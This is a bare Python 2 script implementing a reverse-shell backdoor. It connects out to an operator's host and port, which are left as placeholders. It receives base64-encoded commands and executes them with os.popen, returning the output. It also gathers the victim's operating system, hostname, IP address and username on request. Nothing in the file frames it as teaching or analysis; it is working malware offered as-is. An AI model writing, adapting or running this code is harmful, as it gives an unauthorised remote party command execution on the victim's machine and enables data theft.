
#!/usr/bin/python           

import socket               
import os
import base64
import time
import string
import platform
import getpass
#Host
#Port
def info1():
	out={"type_platform":platform.platform(),"vichostname":socket.gethostname(),"vicip":socket.gethostbyname(socket.gethostname()),"cuser":getpass.getuser()}
	co="operating System : "+out['type_platform']+"\r\n\r\nhostname : "+out['vichostname']+"\r\n\r\nip : "+out['vicip']+"\r\n\r\nCurrent user : "+out['cuser']
	return co
	
def changedir(command):
	command=string.replace(command,"$1%","")
	
	directory=os.path.join(os.getcwd(),command)
	try:
		os.chdir(directory)
		cudir=os.getcwd()
		s.send(base64.b64encode(cudir))
	except :
		s.send("ZGlyZWN0b3J5IG5vdCBmb3VuZC4uIQ==")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)         
                
s.connect((host, port))

while True:
		
		a=s.recv(100000)
		
		if len(a) > 0 :
			a=base64.b64decode(a)
			if a == "info" : 
				inf=info1()
				inf=base64.b64encode(inf)
				s.send(inf)
				continue
			if a == "exit" : break
			
			if "$1%" in a[:3] :
				changedir(a)
				continue
			
				
			com=os.popen(a).read()
			if len(com) > 0 :
				try:
					com=base64.b64encode(com)
					#print com
					s.send(com)
				except :
					print "error"
			else : 
				
				s.send("Q29tbWFuZCBOb3QgRm91bmQuLiE=")
	
s.close   
